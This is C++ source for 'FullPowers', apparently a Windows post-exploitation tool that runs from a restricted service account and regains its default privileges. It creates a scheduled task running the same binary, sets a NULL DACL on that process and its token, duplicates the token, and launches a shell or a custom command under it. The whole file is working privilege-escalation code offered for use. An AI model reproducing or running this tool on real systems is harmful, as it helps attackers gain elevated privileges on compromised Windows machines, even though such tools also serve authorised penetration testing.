#include <iostream>
#include <Windows.h>
#include <strsafe.h>
#include <sddl.h>
#include <lmcons.h>
#include <aclapi.h>
#include "TaskScheduler.h"

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "userenv.lib")

#define VERSION L"0.2"

BOOL g_bInteract = TRUE;
BOOL g_bExtendedPriv = FALSE;
BOOL g_bTaskMode = FALSE;
LPWSTR g_pwszCustomCommand = NULL;

void PrintUsage();
DWORD DoMain();
DWORD DoMainTask();
BOOL GenerateRandomGuid(LPWSTR* ppwszPipeName);
DWORD CreateAndRunScheduledTask();

int wmain(int argc, wchar_t** argv)
{
    while ((argc > 1) && (argv[1][0] == '-'))
    {
        switch (argv[1][1])
        {
        case 'h':
            PrintUsage();
            return 0;
        case 'x':
            g_bExtendedPriv = TRUE;
            break;
        case 't':
            g_bTaskMode = TRUE;
            break;
        case 'z':
            g_bInteract = FALSE;
            break;
        case 'c':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                g_pwszCustomCommand = argv[1];
            }
            else
            {
                wprintf(L"[-] Missing value for option: -c\n");
                PrintUsage();
                return -1;
            }
            break;
        default:
            wprintf(L"[-] Invalid argument: %ws\n", argv[1]);
            PrintUsage();
            return -1;
        }

        ++argv;
        --argc;
    }

    g_bTaskMode ? DoMainTask() : DoMain();

    return 0;
}

void PrintUsage()
{
    wprintf(
        L"\n"
        "FullPowers v%ws (by @itm4n)\n"
        "\n"
        "  This tool leverages the Task Scheduler to recover the default privilege set of a service account.\n"
        "  For more information: https://itm4n.github.io/localservice-privileges/\n"
        "\n", 
        VERSION
    );

    wprintf(
        L"Optional arguments:\n"
        "  -c <CMD>        Custom command line to execute (default is 'C:\\Windows\\System32\\cmd.exe')\n"
        "  -x              Try to get the extended set of privileges (might fail with NETWORK SERVICE)\n"
        "  -z              Non-interactive, create a new process and exit (default is 'interact with the new process')\n"
        "\n"
    );
}

DWORD DoMainTask()
{
    HANDLE hProcessToken = INVALID_HANDLE_VALUE;

    // Grant Full Access to Everyone on the current process
    if (!(SetSecurityInfo(GetCurrentProcess(), SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL) == ERROR_SUCCESS))
    {
        wprintf(L"SetSecurityInfo() failed. Error = %d\n", GetLastError());
        goto cleanup;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hProcessToken))
    {
        wprintf(L"OpenProcessToken() failed. Error = %d\n", GetLastError());
        goto cleanup;
    }

    // Grant Full Access to Everyone on the primary token
    if (!(SetSecurityInfo(hProcessToken, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL) == ERROR_SUCCESS))
    {
        wprintf(L"SetSecurityInfo() failed. Error = %d\n", GetLastError());
        goto cleanup;
    }

    // Sleep 30s so that we have time to capture the token
    Sleep(30000);

cleanup:
    if (hProcessToken)
        CloseHandle(hProcessToken);

    return 0;
}

DWORD DoMain()
{
    DWORD dwCreationFlags = 0;
    LPWSTR pwszCurrentDirectory = NULL;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { 0 };

    DWORD dwTaskPid = 0;
    HANDLE hTaskProcess = INVALID_HANDLE_VALUE;
    HANDLE hTaskToken = INVALID_HANDLE_VALUE;
    HANDLE hTaskTokenDup = INVALID_HANDLE_VALUE;

    dwTaskPid = CreateAndRunScheduledTask();
    if (!dwTaskPid)
    {
        wprintf(L"[-] Failed to create scheduled task.\n");
        goto cleanup;
    }
    
    wprintf(L"[+] Successfully created scheduled task. PID=%d\n", dwTaskPid);
    fflush(stdout);

    hTaskProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, dwTaskPid);
    if (!hTaskProcess)
    {
        wprintf(L"OpenProcess() failed. Error = %d\n", GetLastError());
        goto cleanup;
    }

    if (!OpenProcessToken(hTaskProcess, TOKEN_ALL_ACCESS, &hTaskToken))
    {
        wprintf(L"OpenProcessToken() failed. Error = %d\n", GetLastError());
        goto cleanup;
    }

    if (!DuplicateTokenEx(hTaskToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hTaskTokenDup))
    {
        wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
        goto cleanup;
    }

    // We have our new token, so we can terminate the task process
    if (!TerminateProcess(hTaskProcess, 0))
    {
        wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
    }

    if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
        goto cleanup;

    if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
    {
        wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
        goto cleanup;
    }

    if (!g_bInteract)
        dwCreationFlags |= CREATE_NEW_CONSOLE;

    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);

    // The new token has the same identity so we can call CreateProcessAsUser even if don't SeAssignPrimaryToken
    if (!CreateProcessAsUser(hTaskTokenDup, NULL, g_pwszCustomCommand, NULL, NULL, TRUE, dwCreationFlags, NULL, pwszCurrentDirectory, &si, &pi))
    {
        wprintf(L"[-] CreateProcessAsUser() failed (Err: %d)\n", GetLastError());
        goto cleanup;
    }

    wprintf(L"[+] CreateProcessAsUser() OK\n");
    fflush(stdout);

    if (g_bInteract)
        WaitForSingleObject(pi.hProcess, INFINITE);

cleanup:
    if (hTaskProcess)
        CloseHandle(hTaskProcess);
    if (hTaskToken)
        CloseHandle(hTaskToken);
    if (hTaskTokenDup)
        CloseHandle(hTaskTokenDup);
    if (pwszCurrentDirectory)
        free(pwszCurrentDirectory);
    if (pi.hProcess)
        CloseHandle(pi.hProcess);
    if (pi.hThread)
        CloseHandle(pi.hThread);

    return 0;
}

BOOL GenerateRandomGuid(LPWSTR* ppwszPipeName)
{
    UUID uuid = { 0 };

    if (UuidCreate(&uuid) != RPC_S_OK)
        return FALSE;

    if (UuidToString(&uuid, (RPC_WSTR*)&(*ppwszPipeName)) != RPC_S_OK)
        return FALSE;

    if (!*ppwszPipeName)
        return FALSE;

    return TRUE;
}

DWORD CreateAndRunScheduledTask()
{
    DWORD dwTaskPid = 0;
    LPWSTR pwszRandomName = NULL;
    LPWSTR pwszTaskName = NULL;
    LPWSTR pwszTaskProgram = NULL;
    LPWSTR pwszCurrentUsername = NULL;
    DWORD dwUsernameLen = UNLEN + 1;

    pwszTaskProgram = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
    if (!pwszTaskProgram)
        goto cleanup;

    if (!GetModuleFileName(NULL, pwszTaskProgram, MAX_PATH))
    {
        wprintf(L"[-] GetModuleFileName() failed.\n");
        goto cleanup;
    }

    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
    {
        wprintf(L"[-] GetModuleFileName() failed. Insufficient buffer size.\n");
        goto cleanup;
    }

    if (!GenerateRandomGuid(&pwszRandomName))
        goto cleanup;

    pwszTaskName = (LPWSTR)malloc(256 * sizeof(WCHAR));
    if (!pwszTaskName)
        goto cleanup;

    StringCchPrintf(pwszTaskName, 256, L"FullPowers_%ws", pwszRandomName);

    pwszCurrentUsername = (LPWSTR)malloc(dwUsernameLen * sizeof(WCHAR));
    if (!pwszCurrentUsername)
        goto cleanup;

    if (!GetCurrentUsername(pwszCurrentUsername, &dwUsernameLen))
    {
        wprintf(L"[-] GetCurrentUsername() failed.\n");
        goto cleanup;
    }

    if (!CreateScheduledTask(pwszTaskName, pwszTaskProgram, L"-t", pwszCurrentUsername, g_bExtendedPriv))
    {
        wprintf(L"[-] Failed to create custom scheduled task.\n");
        goto cleanup;
    }

    if (!StartScheduledTask(pwszTaskName, &dwTaskPid))
    {
        wprintf(L"[-] Failed to start scheduled task.\n");
        DeleteScheduledTask(pwszTaskName);
        goto cleanup;
    }

    Sleep(2000);

    if (!DeleteScheduledTask(pwszTaskName))
    {
        wprintf(L"[!] Failed to delete scheduled task.\n");
    }

cleanup:
    if (pwszTaskName)
        free(pwszTaskName);
    if (pwszTaskProgram)
        free(pwszTaskProgram);
    if (pwszRandomName)
        RpcStringFree((RPC_WSTR*)&pwszRandomName);
    if (pwszCurrentUsername)
        free(pwszCurrentUsername);

    return dwTaskPid;
}
